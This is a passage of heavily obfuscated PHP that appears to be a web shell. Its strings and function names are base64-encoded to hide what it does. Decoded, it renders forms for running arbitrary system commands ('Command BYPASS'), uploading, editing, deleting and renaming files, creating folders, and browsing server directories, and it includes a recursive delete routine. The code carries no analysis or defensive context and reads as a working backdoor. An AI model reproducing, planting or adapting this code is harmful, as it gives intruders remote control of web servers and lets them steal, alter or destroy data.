base64_decode('Ij4NCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSIgU2F2ZSAiPjwvZm9ybT48L3RkPg==');
                } else {
                    $yxm_2e = base64_decode('PGhyPjxwPkVycm9yOiBGaWxlIG5vdCBmb3VuZCE8L3A+');
                }
            } elseif (isset($_POST[base64_decode('ZWRpdF9maWxl')])) {
                $afn_57 = $ula_2d . base64_decode('Lw==') . $_POST[base64_decode('ZWRpdF9maWxl')];
                $gew_58 = $_POST[base64_decode('Y29udGVudA==')];
                if ($rkg_1c($afn_57, $gew_58) !== false) {
                    echo base64_decode('PGhyPkZpbGUgRWRpdGVkIHN1Y2Nlc3NmdWxseSEg') . $_POST[base64_decode('ZWRpdF9maWxl')] . base64_decode('PGhyPg==');
                } else {
                    echo base64_decode('PGhyPkVycm9yOiBGYWlsZWQgRWRpdCBGaWxlISA=') . $_POST[base64_decode('ZWRpdF9maWxl')] . base64_decode('PGhyPg==');
                }
            }
        }
        if (!is_dir($ula_2d)) {
            echo base64_decode('PGRpdiBzdHlsZT0iY29sb3I6cmVkO21hcmdpbjoxMHB4IDA7Ij4=');
            echo base64_decode('SW52YWxpZCBvciBpbmFjY2Vzc2libGUgZGlyZWN0b3J5OiA8c3Ryb25nPg==') . htmlspecialchars($ula_2d) . base64_decode('PC9zdHJvbmc+PGJyPjxicj4=');
            echo base64_decode('PGEgaHJlZj0iP2Q9') . tyb_4($rsa_21) . base64_decode('IiBzdHlsZT0iY29sb3I6IGdyZWVuO3BhZGRpbmc6NXB4IDEwcHg7dGV4dC1kZWNvcmF0aW9uOm5vbmU7Ij4=');
            echo base64_decode('4oaQIFtHTyBIb21lXTwvYT4=');
            echo base64_decode('PC9kaXY+');
            die();
        }
        if (!$njv_12($ula_2d)) {
            echo base64_decode('PGRpdiBzdHlsZT0iY29sb3I6cmVkO21hcmdpbjoxMHB4IDA7Ij4=');
            echo base64_decode('RmFpbGVkIHRvIGNoYW5nZSBkaXJlY3RvcnkgdG86IDxzdHJvbmc+') . htmlspecialchars($ula_2d) . base64_decode('PC9zdHJvbmc+PGJyPjxicj4=');
            echo base64_decode('PGEgaHJlZj0iP2Q9') . tyb_4($rsa_21) . base64_decode('IiBzdHlsZT0iY29sb3I6IGdyZWVuO3BhZGRpbmc6NXB4IDEwcHg7dGV4dC1kZWNvcmF0aW9uOm5vbmU7Ij4=');
            echo base64_decode('4oaQIFtHTyBIb21lXTwvYT4=');
            echo base64_decode('PC9kaXY+');
            die();
        }
        echo base64_decode('PGhyPkRJUjog');
        $ugt_59 = array_filter(explode(base64_decode('XFw='), $ula_2d));
        $jvm_5a = '';
        foreach ($ugt_59 as $slz_5b => $zos_5c) {
            $jvm_5a .= ($slz_5b > 0 ? base64_decode('XFw=') : '') . $zos_5c;
            echo ($slz_5b > 0 ? base64_decode('XFw=') : '') . base64_decode('PGEgaHJlZj0iP2Q9') . tyb_4($jvm_5a) . base64_decode('Ij4=') . $zos_5c . base64_decode('PC9hPg==');
        }
        function tyb_4($kko_2a)
        {
            return base64_encode(wrd_3($kko_2a));
        }
        function pvz_5($alm_5d)
        {
            $xli_5e = base64_decode($alm_5d);
            return wrd_3($xli_5e);
        }
        echo base64_decode('PGEgaHJlZj0iP2Q9') . lff_1($fem_22) . base64_decode('Ij4gLyA8c3BhbiBzdHlsZT0iY29sb3I6IGdyZWVuOyI+WyBHTyBIb21lIF08L3NwYW4+PC9hPg==');
        echo base64_decode('PGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4=');
        echo base64_decode('PGhyPg==');
        echo base64_decode('PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVUb1VwbG9hZCIgaWQ9ImZpbGVUb1VwbG9hZCIgcGxhY2Vob2xkZXI9InBpbGloIGZpbGU6Ij4=');
        echo base64_decode('PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCBGaWxlIiBuYW1lPSJzdWJtaXQiPg==');
        echo base64_decode('PC9mb3JtPjxocj4=');
        echo base64_decode('PHRhYmxlPjx0Ym9keT4NCjx0cj4NCjx0ZD4NCjxjZW50ZXI+Q29tbWFuZCBCWVBBU1M8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPw==') . (isset($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]) ? $_SERVER[base64_decode('UVVFUllfU1RSSU5H')] : '') . base64_decode('Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjbWRfaW5wdXQiIHBsYWNlaG9sZGVyPSJFbnRlciBjb21tYW5kIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUnVuIENvbW1hbmQiPjwvZm9ybT48L2NlbnRlcj48L3RkPg0KDQo8dGQ+PGNlbnRlcj5Db21tYW5kIEJJQVNBPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij8=') . (isset($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]) ? $_SERVER[base64_decode('UVVFUllfU1RSSU5H')] : '') . base64_decode('Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjbWRfYmlhc2EiIHBsYWNlaG9sZGVyPSJFbnRlciBjb21tYW5kIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUnVuIENvbW1hbmQiPjwvZm9ybT48Y2VudGVyPjwvdGQ+DQoNCjx0ZD48Y2VudGVyPkNyZWF0ZSBGb2xkZXI8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPw==') . (isset($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]) ? $_SERVER[base64_decode('UVVFUllfU1RSSU5H')] : '') . base64_decode('Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmb2xkZXJfbmFtZSIgcGxhY2Vob2xkZXI9IkZvbGRlciBOYW1lIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQ3JlYXRlIEZvbGRlciI+PC9mb3JtPjxjZW50ZXI+PC90ZD4NCjx0ZD48Y2VudGVyPkNyZWF0ZSBGaWxlPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij8=') . (isset($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]) ? $_SERVER[base64_decode('UVVFUllfU1RSSU5H')] : '') . base64_decode('Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmaWxlX25hbWUiIHBsYWNlaG9sZGVyPSJGaWxlIE5hbWUiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJDcmVhdGUgRmlsZSI+PC9mb3JtPjwvdGQ+PC90cj4NCjwvdGJvZHk+PC90YWJsZT4=');
        echo $yxm_2e;
        echo base64_decode('PHRhYmxlIGJvcmRlcj0xPg==');
        echo base64_decode('PGJyPjx0cj48dGg+PGNlbnRlcj5JdGVtIE5hbWU8L3RoPjx0aD48Y2VudGVyPlNpemU8L3RoPjx0aD48Y2VudGVyPkRhdGU8L3RoPjx0aD48Y2VudGVyPlBlcm1pc3Npb248L3RoPjx0aD48Y2VudGVyPkFjdGlvbjwvdGg+PC90cj4=');
        if (!empty($ula_2d)) {
            foreach ($nhr_14($ula_2d) as $zwc_5f) {
                $alp_60 = $sbi_15($zwc_5f);
                $jkf_61 = $ody_16($alp_60);
                $atv_62 = $zju_17($zwc_5f) ? base64_decode('P2Q9') . lff_1($ula_2d . base64_decode('Lw==') . $zwc_5f) : base64_decode('Pw==') . (base64_decode('ZD0=') . lff_1($ula_2d) . base64_decode('JmY9') . lff_1($zwc_5f));
                $wzt_63 = substr(sprintf(base64_decode('JW8='), fileperms($alp_60)), -4);
                $tyg_64 = $ukp_18($alp_60);
                echo base64_decode('PHRyPg0KICAgICAgICA8dGQgY2xhc3M9Iml0ZW0tbmFtZSI+PGEgaHJlZj0i') . $atv_62 . base64_decode('Ij4=') . $zwc_5f . base64_decode('PC9hPjwvdGQ+DQogICAgICAgIDx0ZCBjbGFzcz0ic2l6ZSI+') . filesize($alp_60) . base64_decode('PC90ZD4NCiAgICAgICAgPHRkIGNsYXNzPSJkYXRlIiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyI+') . date(base64_decode('WS1tLWQgSDppOnM='), filemtime($alp_60)) . base64_decode('PC90ZD4NCiAgICAgICAgPHRkIGNsYXNzPSJwZXJtaXNzaW9uIA==') . ($tyg_64 ? base64_decode('d3JpdGFibGU=') : base64_decode('bm90LXdyaXRhYmxl')) . base64_decode('Ij4=') . $wzt_63 . base64_decode('PC90ZD4NCiAgICAgICAgPHRkPg0KICAgICAgICA8ZGl2IGNsYXNzPSJmbHgiPg0KICAgICAgICA8ZGl2IGNsYXNzPSIiPg0KICAgICAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI/') . (isset($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]) ? $_SERVER[base64_decode('UVVFUllfU1RSSU5H')] : '') . base64_decode('Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ2aWV3X2ZpbGUiIHZhbHVlPSI=') . $ans_1b($zwc_5f) . base64_decode('Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iIFZpZXcgIj48L2Zvcm0+PC9jZW50ZXI+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSIiPg0KICAgICAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI/') . (isset($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]) ? $_SERVER[base64_decode('UVVFUllfU1RSSU5H')] : '') . base64_decode('Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkZWxldGVfZmlsZSIgdmFsdWU9Ig==') . $ans_1b($zwc_5f) . base64_decode('Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRGVsZXRlIj48L2Zvcm0+PC9jZW50ZXI+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSIiID4NCiAgICAgICAgPGNlbnRlcj48Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPw==') . (isset($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]) ? $_SERVER[base64_decode('UVVFUllfU1RSSU5H')] : '') . base64_decode('Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvbGRfbmFtZSIgdmFsdWU9Ig==') . $ans_1b($zwc_5f) . base64_decode('Ij48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibmV3X25hbWUiIHBsYWNlaG9sZGVyPSJOZXcgTmFtZSI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0icmVuYW1lX2l0ZW0iIHZhbHVlPSJSZW5hbWUiPjwvZm9ybT48L2NlbnRlcj4NCiAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8L3RkPg0KICAgIDwvdHI+');
            }
        } else {
            echo base64_decode('RXJyb3I6IEN1cnJlbnQgZGlyZWN0b3J5IGlzIGVtcHR5Lg==');
        }
        echo base64_decode('PC90YWJsZT4=');
        function nxy_6($kzy_65)
        {
            $ltw_e = base64_decode('dQ==') . base64_decode('bg==') . base64_decode('bA==') . base64_decode('aQ==') . base64_decode('bg==') . base64_decode('aw==');
            if (!file_exists($kzy_65)) {
                return true;
            }
            if (!is_dir($kzy_65)) {
                return $ltw_e($kzy_65);
            }
            $nhr_14 = base64_decode('cw==') . base64_decode('Yw==') . base64_decode('YQ==') . base64_decode('bg==') . base64_decode('ZA==') . base64_decode('aQ==') . base64_decode('cg==');
            foreach ($nhr_14($kzy_65) as $rig_66) {
                if ($rig_66 == base64_decode('Lg==') || $rig_66 == base64_decode('Li4=')) {
                    continue;
                }
                if (!nxy_6($kzy_65 . DIRECTORY_SEPARATOR . $rig_66)) {
                    return false;
                }
            }
            return rmdir($kzy_65);
        }
